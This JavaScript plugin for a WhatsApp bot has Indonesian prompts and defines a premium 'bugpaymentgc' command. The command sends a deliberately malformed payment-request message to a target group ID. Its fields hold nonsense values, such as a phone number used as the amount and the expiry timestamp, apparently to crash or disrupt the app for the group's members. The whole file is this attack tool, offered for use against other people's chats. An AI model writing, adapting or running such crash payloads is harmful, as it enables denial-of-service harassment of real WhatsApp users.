let fs = require('fs')
//let { doctext } = require('../src/doctext.js')

let handler = async(m, { conn, usedPrefix, command, text }) => {
    let nomornya = text
    if (!text) { throw `Masukkan id grup target\n\nContoh: ${usedPrefix + command} 6281211233903-1634615611\n\nNote: tanpa @g.us`
    } else {
    conn.relayMessage(nomornya + '@g.us', { requestPaymentMessage: { Message: { TextMessage: { text: `ya`, currencyCodeIso4217: 'IDR', requestFrom: '6283821123163@s.whatsapp.net', expiryTimestamp: 6283821123163, amount: 6283821123163, background: fs.readFileSync('./src/logo.jpg') }}}}, {})
    m.reply(`Sukses Mengirim Bugpayment Ke Grup Id ${text}`)
    }
}
handler.command = /^(bugpaymentgc)$/i
handler.premium = true
handler.tags = ['premium']
handler.help = ['bugpaymentgc']

module.exports = handler